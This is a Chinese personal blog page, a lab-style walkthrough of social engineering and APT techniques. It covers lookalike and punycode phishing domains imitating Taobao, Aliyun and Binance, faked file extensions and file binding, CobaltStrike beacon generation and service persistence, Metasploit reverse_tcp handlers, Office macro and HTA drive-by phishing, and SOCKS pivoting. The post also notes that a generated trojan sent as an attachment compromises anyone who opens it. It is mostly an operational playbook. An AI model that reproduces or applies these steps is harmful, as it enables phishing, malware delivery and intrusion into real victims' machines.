@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="future.zhangyan">
+
+
+
+    <meta name="description" content="未来可期">
+
+
+
+<title>社工、APT | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+	<!--动态线条背景-->
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body>
+    <div class="wrapper">
+        <header>
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet">
+	  <script type="text/javascript" src="C:/Users/zhangyan/Desktop/blog/themes/next/source/js"></script>
+
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">张艳&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+				<label for="switch_default" class="toggleBtn"></label>
+         
+				<div class="search bar7">
+					<form id="search-form"> <!-- 搜索框相关 -->
+						<input type="text" id="local-search-input" name="q" results="0" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off"/>
+						<button type="submit" class="search-form-submit"></button>
+						<i class="fa fa-times" onclick="resetSearch()"></i> <!-- 清空/重置搜索框 -->
+					</form>
+					<div class="ins-section-wrapper">
+						<div class="ins-section-container"></div>
+					</div>
+					<div id="local-search-result"></div> <!-- 搜索结果区 -->
+						<p class='no-result'>No results found </p> <!-- 无匹配时显示，注意请在 CSS 中设置默认隐藏 -->
+					</div>
+
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">张艳&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+            </div>
+
+
+        </div>
+    </nav>
+
+</header>
+<style type="text/css">
+	* {
+		box-sizing:border-box;
+	}
+	body {
+		margin:0;
+		padding:0;
+		background-image:url(ydrzimages/p3.jpg);
+		font-weight:500;
+		font-family:"Microsoft YaHei","宋体","Segoe UI","Lucida Grande",Helvetica,Arial,sans-serif,FreeSans,Arimo;
+	}
+	#container {
+		width:500px;
+		height:820px;
+		margin:0 auto;
+	}
+	div.search {
+		padding:10px 0;
+		margin-left:200px
+	}
+	form {
+		position:relative;
+		width:300px;
+		margin:0 auto;
+	}
+	input,button {
+		border:none;
+		outline:none;
+	}
+	input {
+		width:100%;
+		height:42px;
+		padding-left:13px;
+	}
+	button {
+		height:42px;
+		width:42px;
+		cursor:pointer;
+		position:absolute;
+	}
+	/*搜索框7*/
+		  
+	.bar7 form {
+		height:42px;
+	}
+	.bar7 input {
+		width:200px;
+		border-radius:42px;
+		border:2px solid #324B4E;
+		transition:.3s linear;
+		float:right;
+	}
+	.bar7 input:focus {
+		width:300px;
+	}
+	.bar7 button {
+		background:none;
+		top:-2px;
+		right:20px;
+	}
+	.bar7 button:before {
+		content:"点..";
+		font-family:FontAwesome;
+		color:#324b4e;
+	}
+	.no-result{
+		display:none
+	}
+</style>
+
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">社工、APT</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">future.zhangyan</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">February 24, 2020&nbsp;&nbsp;20:23:45</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                            
+                        </span>
+						<span id="/2020/02/24/%E7%A4%BE%E5%B7%A5%E3%80%81APT/" class="leancloud-visitors view" data-flag-title="社工、APT">
+						  <em class="post-meta-item-text">Pageviews:</em>
+						  <i class="leancloud-visitors-count"></i>
+						</span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/%E7%A4%BE%E5%B7%A5%E3%80%81APT.png"></p>
+<h2 id="伪造邮件发送试验"><a href="#伪造邮件发送试验" class="headerlink" title="伪造邮件发送试验"></a>伪造邮件发送试验</h2><p>要想查看一个域名是否配置了SPF，可以用nslookup或者dig查看：</p>
+<p>nslookup</p>
+<p>-type=txt ***.com.cn</p>
+<p>dig -t txt 163.com</p>
+<p>未配置的是这样：</p>
+<p><img src="/image/apt/1.jpg"></p>
+<p>配置了的是这样</p>
+<p><img src="/image/apt/2.jpg"></p>
+<p>SPF可以配置为ip，也可以配置为域名</p>
+<p><img src="/image/apt/3.jpg"></p>
+<h2 id="钓鱼域名试验"><a href="#钓鱼域名试验" class="headerlink" title="钓鱼域名试验"></a>钓鱼域名试验</h2><p>有了文案，怎么能让邮件看起来真实性更高呢？最简单的就是用超链接,把元素内容改成想要仿冒的域名，在邮箱页面上，就会直接显示元素的内容，我们可以使用一些与目标相似的域名。比如用0代替o，用1代替l，用vv代替w等等，这就需要发挥你的想象来寻找相似的域名：</p>
+<p><a target="_blank" rel="noopener" href="http://www.taoba0.com/">http://www.taoba0.com/</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.a1iyun.com/">http://www.a1iyun.com</a></p>
+<p>如果找不到这样形似的域名或者这种域名比较贵的情况下，可以尝试一些更骚的操作。。例如使用国际域名这样的域名是怎么注册的呢？在了解怎么注册一个这样的域名前，需要先了解什么是国际域名（Internationalized domain name, IDN）。</p>
+<p><strong>IDN：</strong></p>
+<p>是指在域名中包含至少一个特殊语言字母的域名，特殊语言包括中文、法文、拉丁文等。在DNS系统工作中，这种域名会被编码成ASCII字符串，并通过Punycode进行翻译。</p>
+<p>Punycode是一个根据RFC 3492标准而制定的编码系统,主要用于把域名从地方语言所采用的Unicode编码转换成为可用於DNS系统的编码。</p>
+<p>目前，因为操作系统的核心都是英文组成，DNS服务器的解析也是由英文代码交换，所以DNS服务器上并不支持直接的中文域名解析，所有中文域名的解析都需要转成punycode码，然后由DNS解析punycode码。其实目前所说的各种主流浏览器都完美支持IDN域名，浏览器里面会自动对IDN域名进行Punycode转码，而地址栏依旧显示的是原始输入的IDN域名。</p>
+<p>所以，要想注册“币安”的这个域名：</p>
+<p><a target="_blank" rel="noopener" href="http://www.biṇaṇce.com/">www.biṇaṇce.com</a></p>
+<p>其实只需要注册他经过punycode转码后的域名：</p>
+<p><a target="_blank" rel="noopener" href="http://www.biṇaṇce.com/">www.xn--biace-4l1bb.com</a></p>
+<p>然后让目标访问<a href="http://www.biṇaṇce.com，在地址栏中就很难被发现。[punycode在线转换工具：http://tools.jb51.net/punycode/index.php](https://links.jianshu.com/go?to=http%3A%2F%2Ftools.jb51.net%2Fpunycode%2Findex.php)">www.biṇaṇce.com，在地址栏中就很难被发现。[punycode在线转换工具：http://tools.jb51.net/punycode/index.php](https://links.jianshu.com/go?to=http%3A%2F%2Ftools.jb51.net%2Fpunycode%2Findex.php)</a></p>
+<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.cnblogs.com/csguo/p/7401874.html">UniCode编码表</a><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.cnblogs.com/csguo/p/7401874.html">https://www.cnblogs.com/csguo/p/7401874.html</a></p>
+<p>这样我们便可以伪造域名钓鱼</p>
+<p><img src="/image/apt/4.jpg"></p>
+<p>然后将IDN域名以超链接写入邮件</p>
+<p><img src="/image/apt/5.jpg"></p>
+<p><strong>https**</strong>证书**</p>
+<p>最后要说一点，就是https证书，前边仿冒的再像，但如果浏览器上直接出现了不安全警告或者红斜杠，也很容易引起目标的警惕。所以在条件允许的情况下，尽量做戏做全套，现在普通的https证书也是很便宜的。证书的具体申请使用就不在这细说了，百度一下，全都知道。</p>
+<h2 id="完成伪造扩展名试验"><a href="#完成伪造扩展名试验" class="headerlink" title="完成伪造扩展名试验"></a>完成伪造扩展名试验</h2><p>使用KilerRat工具：</p>
+<p><img src="/image/apt/6.jpg"></p>
+<p><img src="/image/apt/7.jpg"></p>
+<p>我们也可以使用图标修改器改图标</p>
+<h2 id="完成文件困绑试验"><a href="#完成文件困绑试验" class="headerlink" title="完成文件困绑试验"></a>完成文件困绑试验</h2><p><img src="/image/apt/8.jpg"></p>
+<p><img src="/image/apt/9.jpg"></p>
+<h2 id="完成综合apt攻击工具cs木马上线实验"><a href="#完成综合apt攻击工具cs木马上线实验" class="headerlink" title="完成综合apt攻击工具cs木马上线实验"></a>完成综合apt攻击工具cs木马上线实验</h2><p>CobaltStrike是一款美国Red</p>
+<p>Team开发的渗透测试神器，常被业界人称为CS。最近这个工具大火，成为了渗透测试中不可缺少的利器。其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。同时，Cobalt</p>
+<p>Strike还可以调用Mimikatz等其他知名工具，因此广受黑客喜爱。</p>
+<p>CobaltStrike分为客户端和服务端可分布式操作可以协同作战。但一定要架设在外网上。当然你知道利用这款工具主要用于内网渗透以及APT攻击。</p>
+<p>项目官网:<a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com</a></p>
+<h4 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a><strong>实验环境：</strong></h4><p>服务器端（Linux）：192.168.0.109 靶机（windows）:192.168.19.130</p>
+<p>使用cobaltstrike 3.14</p>
+<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a><strong>实验步骤</strong></h3><p>将工具上传到kali系统中运行时给777权限</p>
+<p>root@kali:/mnt/cobaltstrike# chmod 777 /mnt/cobaltstrike/</p>
+<h5 id="一、启动，连接服务器"><a href="#一、启动，连接服务器" class="headerlink" title="一、启动，连接服务器"></a>一、启动，连接服务器</h5><p>启动服务端：(test 为待会靶机连接服务器的密码）./teamserver 192.168.0.109 test</p>
+<p>Test为密码hash密码要与客户端一样诺不一样则此软件存在后面</p>
+<p><img src="/image/apt/10.jpg"></p>
+<p>密码设置为test你可以设置为其它</p>
+<p>客户端连接服务器运行：cs.bat</p>
+<p><img src="/image/apt/11.jpg"></p>
+<p>启动客户端，输入ip，密码，端口，用户默认</p>
+<p>如果客户端 是Linux操作系统则运行以下命令，启动客户端：java -Dfile.encoding=UTF-8</p>
+<p>-javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap</p>
+<p>-XX:+UseParallelGC -jar cobaltstrike.jar</p>
+<p>创建监听器。</p>
+<h4 id="创建监听器"><a href="#创建监听器" class="headerlink" title="创建监听器"></a><strong>创建监听器</strong></h4><blockquote>
+<p>1、点击 Cobalt Strike -&gt;</p>
+<p>Listeners-&gt;Add，其中内置了八个Payload，</p>
+<p>wndows/beacon_dns/reverse_dns_txt</p>
+<p>windows/beacon_http/reverse_http</p>
+<p>windows/beacon_https/reverse_https</p>
+<p>windows/beacon_bind_pipe</p>
+<p>windows/beacon_tcp</p>
+<p>windows/beacon_extc2</p>
+<p>windows/foreign/reverse_http</p>
+<p>windows/foreign/reverse_https</p>
+</blockquote>
+<p><img src="/image/apt/12.jpg"></p>
+<p><img src="/image/apt/13.jpg"></p>
+<h4 id="生成木马创建payload-让主机上线"><a href="#生成木马创建payload-让主机上线" class="headerlink" title="生成木马创建payload 让主机上线"></a><strong>生成木马创建payload 让主机上线</strong></h4><p><img src="/image/apt/14.jpg"></p>
+<p><img src="/image/apt/15.jpg"></p>
+<p>运行该exe主机成功上线：可以查看上线主机的磁盘信息，进行端口扫描，查看进程等信息。</p>
+<p>同理如果将生成的artifact.exe作为附件发送给其他人，只要有人点击，则他的机器会上线。不过现在的电脑都装了杀毒软件，所以payload需做免杀。这个后续在研发</p>
+<p><img src="/image/apt/16.jpg"></p>
+<p><img src="/image/apt/17.jpg"></p>
+<h2 id="HttpsPayload应用"><a href="#HttpsPayload应用" class="headerlink" title="HttpsPayload应用"></a>HttpsPayload应用</h2><p>优点：可能过行为查杀、另外administrator运行可直接提升为system权限</p>
+<p>第一步</p>
+<p><img src="/image/cs/1.jpg"></p>
+<p>Windows Service需要向操作系统注册EXE直接运行  </p>
+<p><img src="/image/cs/2.jpg"></p>
+<p>第二步：创建服务</p>
+<p>Sc create test binpath= ”c:\test.exe”      //创建的服务名，binPath后面是运行exe文件的所在路径    创建一个路径一般放在C:\Windows\System32下因为这个路径执行文件最多</p>
+<p>start= auto displayname= ”test”          //<strong>将exe注册为windows服务 displayname</strong>服务器名称</p>
+<p>Sc start test                    //开启这个服务</p>
+<p>Sc delete test                   //删除这个服务</p>
+<p>Sc top test                       //首先使用这个服务 </p>
+<h2 id="sc配置服务"><a href="#sc配置服务" class="headerlink" title="sc配置服务"></a>sc配置服务</h2><blockquote>
+<p>有以下集中方式：</p>
+<p>sc config 服务名 start= AUTO    (自动)</p>
+<p>sc config 服务名 start= DEMAND  (手动)</p>
+<p>sc config 服务名 start= DISABLED(禁用)</p>
+</blockquote>
+<p>关于SC</p>
+<p>可参考一个网友的博文—SC命令管理服务状态：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://blog.csdn.net/ddjj_1980/article/details/7493045">http://blog.csdn.net/ddjj_1980/article/details/7493045</a></p>
+<h2 id="结合metasploit-反弹shell"><a href="#结合metasploit-反弹shell" class="headerlink" title="结合metasploit,反弹shell"></a>结合metasploit,反弹shell</h2><ol>
+<li>MSF中use exploit/multi/handler，然后set payload windows/meterpreter/reverse_tcp、set lhost、set lport；然后CS中新建监听器；一个test社工肉鸡运行，然后新建监听器reverse_tcp派生会话，run：</li>
+</ol>
+<p><img src="/image/cs/3.jpg"></p>
+<p>新建两个监听器一个放木马上线</p>
+<p>在靶机中使用Cobalt Strike创建一个windows/foreign/reverse_tcp的Listener。其中ip为Metasploit的ip地址，端口为Metasploit所监听的端口。</p>
+<p>选中刚刚新建msf</p>
+<p><img src="/image/cs/4.jpg"></p>
+<p><img src="/image/cs/5.jpg"></p>
+<p><img src="/image/cs/6.jpg"></p>
+<p><img src="/image/cs/7.jpg"></p>
+<p>session -i查看会话然后session -i 1进入</p>
+<p>派生给reverse_tcp然后Exploit</p>
+<h2 id="office宏钓鱼"><a href="#office宏钓鱼" class="headerlink" title="office宏钓鱼"></a>office宏钓鱼</h2><p>攻击→后门→MS office 然后复制恶意代码→插入office的宏中，社工肉鸡打开即可</p>
+<p><img src="/image/cs/8.jpg"></p>
+<p><img src="/image/cs/9.jpg"></p>
+<p> MSF中use exploit/multi/handler，然后set payload windows/meterpreter/reverse_tcp、set lhost、set lport；然后CS中新建监听器；一个test社工肉鸡运行，然后新建监听器reverse_tcp派生会话，run：或使用另一个监听器可以直接在图形化界面使用</p>
+<p>或使用另一个监听器可以直接在图形化界面使用</p>
+<p><img src="/image/cs/10.jpg"></p>
+<p>下载运行则中招</p>
+<p>Cs 生成的代码直接放到创建里面去，注意：做试验的时候，宏的位置不要设置所有的活动模板和文档，建设应用在当前文档，不然本机所有word文档运行都会种上你的木马，另外打开word文档有宏提示，一般是word默认禁用所有宏（文件—选项—信任中心—信任中心设置里面配置）。</p>
+<h2 id="hta网页挂马"><a href="#hta网页挂马" class="headerlink" title="hta网页挂马"></a>hta网页挂马</h2><p>第一步：生成hta</p>
+<p><img src="/image/cs/11.jpg"></p>
+<p><img src="/image/cs/12.jpg"></p>
+<p>第二步：使用文件下载</p>
+<p><img src="/image/cs/13.jpg"></p>
+<p><img src="/image/cs/14.jpg"></p>
+<p>点击开始之后，evil.hta文件会自动传到cs uploads目录。</p>
+<p><img src="/image/cs/15.jpg"></p>
+<p><img src="/image/cs/16.jpg"></p>
+<p>如果之前设置过钓鱼页面，记得一定要删掉，不然会克隆的时候会报错</p>
+<p><img src="/image/cs/17.jpg"></p>
+<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>\1. 先制作HTML：<a target="_blank" rel="noopener" href="http://192.168.1.184/test.hta">http://192.168.1.184:80/test.hta</a></p>
+<p>\2. 钓鱼攻击→文件下载：<a target="_blank" rel="noopener" href="http://192.168.1.184/download/file.ext">http://192.168.1.184:80/download/file.ext</a></p>
+<p>\3. 钓鱼攻击→克隆网站：<a target="_blank" rel="noopener" href="http://192.168.1.184/">http://192.168.1.184:80/</a></p>
+<p>\4. 社工肉鸡打开：</p>
+<p><img src="/image/cs/18.jpg"></p>
+<p>键盘记录</p>
+<h2 id="邮件钓鱼"><a href="#邮件钓鱼" class="headerlink" title="邮件钓鱼"></a>邮件钓鱼</h2><p>\1. 邮件钓鱼：</p>
+<p><img src="/image/cs/19.jpg"></p>
+<p><img src="/image/cs/20.jpg"></p>
+<p>附件下载后运行</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>制作好钓鱼页面：可以使用<a href="https://bitly.com制作短网址，然后让对方打开：">https://bitly.com制作短网址，然后让对方打开：</a></p>
+<p><img src="/image/cs/21.jpg"></p>
+<p>然后设置好跳转的网址</p>
+<p><img src="/image/cs/22.jpg"></p>
+<p>以通过<a target="_blank" rel="noopener" href="https://bitly.com生成url短链接/">https://bitly.com生成url短链接</a> （）   </p>
+<h2 id="socks代理："><a href="#socks代理：" class="headerlink" title="socks代理："></a>socks代理：</h2><p>win7双网卡：内网：172.16.2.1    </p>
+<p>win2003：172.16.2.2</p>
+<p><img src="/image/cs/23.jpg"></p>
+<p>win7双网卡</p>
+<p><img src="/image/cs/24.jpg"></p>
+<p>2003内网：172.16.2.1</p>
+<p>MSF中：setg Proxies socks4:192.168.1.184:40520；use auxiliary/scanner/smb/smb_version；然后set rhosts 172.16.2.2；run</p>
+<p><img src="/image/cs/25.jpg"></p>
+<p><strong>setg Proxiessocks4:192.168.0.106:6677</strong></p>
+<p>也可以使用下面方法：</p>
+<p>开启socks4a代理，通过代理进行内网渗透</p>
+<p>开启socks，可以通过命令，也可以通过右键Pivoting-&gt;SOCKS Server</p>
+<p>beacon&gt; socks2222</p>
+<p>[+] startedSOCKS4a server on: 2222</p>
+<p>[+] host calledhome, sent: 16 bytes</p>
+<p>然后vim</p>
+<p>/etc/proxychains.conf ，在文件末尾添加socks4代理服务器</p>
+<p><img src="/image/cs/26.jpg"></p>
+<p>使用proxychains代理扫描内网主机  proxychains nmap -sP192.168.183.0/24</p>
+<p><img src="/image/cs/27.jpg"></p>
+<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a><strong>小结：</strong></h3><p>\1. CS可以创建多个客户端，操作方便</p>
+<p>\2. 功能扩展比较多，如：payload可以多种语言。</p>
+<p>\3. 支持宏的办公软件都可以（office/WPS）</p>
+<p>\4. 默认宏安全性高/非常安全，运行宏时会提示；中低不会提示，打开world有提示，说明宏很有可能有木马。</p>
+<hr>
+<h2 id="cs提权"><a href="#cs提权" class="headerlink" title="cs提权"></a>cs提权</h2><p>你以什么权限运行的木马，那么木马将拥有此权限，如果权限过低我们只能进行提权。</p>
+<p>提权插件下载<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/rsmudge/Elevatekit">https://github.com/rsmudge/Elevatekit</a></p>
+<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://k8gege.org/Download/">http://k8gege.org/Download/</a></p>
+<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/k8gege/Aggressor">https://github.com/k8gege/Aggressor</a></p>
+<p><img src="/image/cs/28.jpg"></p>
+<p>选择脚本管理器将下载好的插件放入进去不要有中午目录</p>
+<p><img src="/image/cs/29.jpg"></p>
+<hr>
+<p>内网渗透插件加使用方法</p>
+<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/k8gege/Aggressor">https://github.com/k8gege/Aggressor</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>future.zhangyan</span>
+                    </p>
+                
+				
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://zhangyanlady.github.io/2020/02/24/%E7%A4%BE%E5%B7%A5%E3%80%81APT/">https://zhangyanlady.github.io/2020/02/24/%E7%A4%BE%E5%B7%A5%E3%80%81APT/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>The future can be expected, the world is worth it.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"># 网络安全</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/03/09/sqlmap%E4%BD%BF%E7%94%A8/">sqlmap使用</a>
+            
+            
+            <a class="next" rel="next" href="/2020/02/20/%E6%9F%A5%E6%89%BE%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80/">查找网站后台地址</a>
+            
+        </section>
+			</br>
+			
+
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© future.zhangyan | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+	<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+    </div>
+
+
+	
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
